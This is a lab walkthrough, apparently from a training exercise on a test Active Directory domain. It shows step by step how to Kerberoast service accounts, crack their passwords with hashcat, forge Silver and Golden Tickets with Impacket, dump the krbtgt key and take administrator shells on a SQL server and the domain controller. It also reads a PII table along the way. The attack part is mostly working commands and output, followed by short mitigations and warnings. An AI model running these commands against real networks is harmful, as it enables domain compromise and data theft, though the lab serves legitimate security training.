# Lab: Kerberoasting and Silver Ticket Attacks Walkthrough

## 1. Identifying Potentially Crackable SPNs

**Command:**

```bash
impacket-GetUserSPNs -dc-host dc.hirapo.com -outputfile spns.txt hirapo.com/blee:Password1
```

**Expected Results:**

```
ServicePrincipalName            Name         MemberOf                                       PasswordLastSet             LastLogon                   Delegation
------------------------------- -----------  ---------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/sql01.hirapo.com:1433  sqlservice1  CN=Service Accounts,CN=Users,DC=hirapo,DC=com  2025-04-30 22:18:41.897136  2025-04-30 23:16:04.398433             
MSSQLSvc/sql01.hirapo.com       sqlservice1  CN=Service Accounts,CN=Users,DC=hirapo,DC=com  2025-04-30 22:18:41.897136  2025-04-30 23:16:04.398433             
MSSQLSvc/sql02.hirapo.com:1433  sqlservice2  CN=Service Accounts,CN=Users,DC=hirapo,DC=com  2025-04-30 22:19:18.229622  2025-05-01 14:10:45.912218             
MSSQLSvc/sql02.hirapo.com       sqlservice2  CN=Service Accounts,CN=Users,DC=hirapo,DC=com  2025-04-30 22:19:18.229622  2025-05-01 14:10:45.912218             
```

SPNs saved to `spns.txt` for cracking.

## 2. Cracking the Ticket

**Command:**

```bash
hashcat -h | grep Kerberos
```

**Kerberoast Mode Identified:** `-m 13100` (etype 23, RC4)

**Check Ticket Etype:**

```bash
head -c 12 spns.txt
```

**Result:** `$krb5tgs$23$`

**Crack with Hashcat:**

```bash
hashcat -m 13100 spns.txt -a 6 /opt/passwordlists/google-10000-english-no-swears.txt ?s
```

**Cracked Password Output:**

```
...Shooting*
```

## 3. Using the Cracked Credential

**RDP Attempt (Fails):**

```bash
xfreerdp3 /cert:ignore /d:hirapo.com /u:sqlservice1 /p:'Shooting*' /v:sql01.hirapo.com
```

**MSSQLClient Attempt (Fails):**

```bash
impacket-mssqlclient -port 1433 'hirapo.com/sqlservice1:Shooting*@sql01.hirapo.com'
```

## 4. Setup for Silver Ticket Attack

**Get Domain SID:**

```bash
impacket-lookupsid hirapo.com/blee:Password1@dc.hirapo.com 999
```

**Result:**

```
Domain SID: S-1-5-21-3665665769-2465453898-254577537
```

## 5. Building a Silver Ticket

**Convert Password to NT Hash:**

```bash
mkpasswd --method=nt Shooting* | cut -d $ -f 4
```

**Result:** `65da88fb215c0ca9d556eea07fb47ab5`

**Generate Ticket:**

```bash
impacket-ticketer -domain hirapo.com -domain-sid S-1-5-21-3665665769-2465453898-254577537 -dc-ip dc.hirapo.com -nthash 65da88fb215c0ca9d556eea07fb47ab5 -spn MSSQLSvc/sql01.hirapo.com Administrator
```

## 6. Using the Silver Ticket

**Set Ticket:**

```bash
export KRB5CCNAME=Administrator.ccache
```

**Connect to SQL with Ticket:**

```bash
impacket-mssqlclient -k -no-pass sql01.hirapo.com
```

**Switch to `pii` DB:**

```sql
use pii;
SELECT * FROM INFORMATION_SCHEMA.TABLES;
select * from clients;
```

## 7. Another Silver Ticket (Fake User)

**Create Ticket for Fake User:**

```bash
impacket-ticketer -domain hirapo.com -domain-sid S-1-5-21-3665665769-2465453898-254577537 -dc-ip dc.hirapo.com -nthash 65da88fb215c0ca9d556eea07fb47ab5 -spn MSSQLSvc/sql01.hirapo.com -user-id 777 pwned
```

**Set Ticket and Connect:**

```bash
export KRB5CCNAME=pwned.ccache
impacket-mssqlclient -k -no-pass sql01.hirapo.com
```

**Check SID:**

```sql
use pii;
select dbo.fn_SIDToString(SUSER_SID());
```

**Verify User Does Not Exist:**

```sql
EXEC xp_logininfo 'hirapo\pwned','all';
```

## 8. Cracking Another Account

**Check `sqlservice2` Info:**

```sql
EXEC xp_logininfo 'hirapo\sqlservice2','all';
```

**Crack Another Password:**

```bash
hashcat -m 13100 spns.txt -a 6 /opt/passwordlists/google-10000-english-no-swears.txt ?d?s
```

**Result:** `Database2!`

---

## Conclusions

This lab demonstrated:

* **Kerberoasting:** Allows offline cracking of service account passwords using SPNs.
* **Silver Ticket Attacks:** Allows forging of Kerberos TGS tickets to impersonate real or fake users.

**Mitigations:**

* Use long, complex passwords for service accounts.
* Rotate service account passwords regularly.
* Restrict service account privileges and login capabilities.

# Kerberos Golden Ticket Lab Walkthrough

## 1. Using Domain Admin Credentials

**Command:**

```bash
impacket-wmiexec 'hirapo.com/sqlservice2:Database2!@sql01.hirapo.com'
```

**Result:**

```
STATUS_LOGON_TYPE_NOT_GRANTED - Logon not permitted for service account.
```

## 2. Dumping KRBTGT Hash

**Command:**

```bash
impacket-secretsdump 'hirapo.com/sqlservice2:Database2!@dc.hirapo.com' -just-dc-user krbtgt
```

**Result Highlights:**

```
krbtgt NT hash: d488f80321a1e387179634fc964a53a4
krbtgt AES128: e633d31b7cfbab1a394d14e883dd99b7
```

Note: AES keys preferred due to newer Windows Server hardening.

## 3. Gathering Domain SID

**Command:**

```bash
impacket-lookupsid 'hirapo.com/sqlservice2:Database2!@dc.hirapo.com' 500
```

**Result:**

```
Domain SID: S-1-5-21-3665665769-2465453898-254577537
```

**Optional Domain Recon:**

```bash
nmap dc.hirapo.com -F --script=rdp-ntlm-info
```

## 4. Generating the Golden Ticket

**Command:**

```bash
impacket-ticketer -domain hirapo.com -domain-sid S-1-5-21-3665665769-2465453898-254577537 \
-aesKey e633d31b7cfbab1a394d14e883dd99b7 Administrator
```

**Result:**

```
Ticket saved as Administrator.ccache
```

## 5. Using the Ticket

**Set Environment Variable:**

```bash
export KRB5CCNAME=Administrator.ccache
```

**Command:**

```bash
impacket-wmiexec -k -no-pass -dc-ip dc.hirapo.com sql01.hirapo.com
```

**Post-Login Commands:**

```cmd
whoami
hostname
```

**Expected Output:**

```
hirapo.com\administrator
sql01
```

## 6. Reusing the Ticket (Domain Controller)

**Command:**

```bash
impacket-wmiexec -k -no-pass -dc-ip dc.hirapo.com dc.hirapo.com
```

**Expected Output:**

```
C:\> whoami
hirapo.com\administrator
```

## Summary

* Golden Tickets allow forging of Kerberos TGTs.
* With KRBTGT AES key, impersonation of any user is possible.
* Works across the domain (unlike Silver Tickets, which are service/server specific).
* Powerful for persistence: revoking access requires KRBTGT password rotation **twice**.

## Warnings

* Always test responsibly.
* Use in controlled lab environments only.
* Unauthorized use of Golden Ticket techniques is illegal and unethical.

---

## Related Tools

* [Impacket](https://github.com/fortra/impacket)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Windows only)
* [Rubeus](https://github.com/GhostPack/Rubeus) (Windows only)

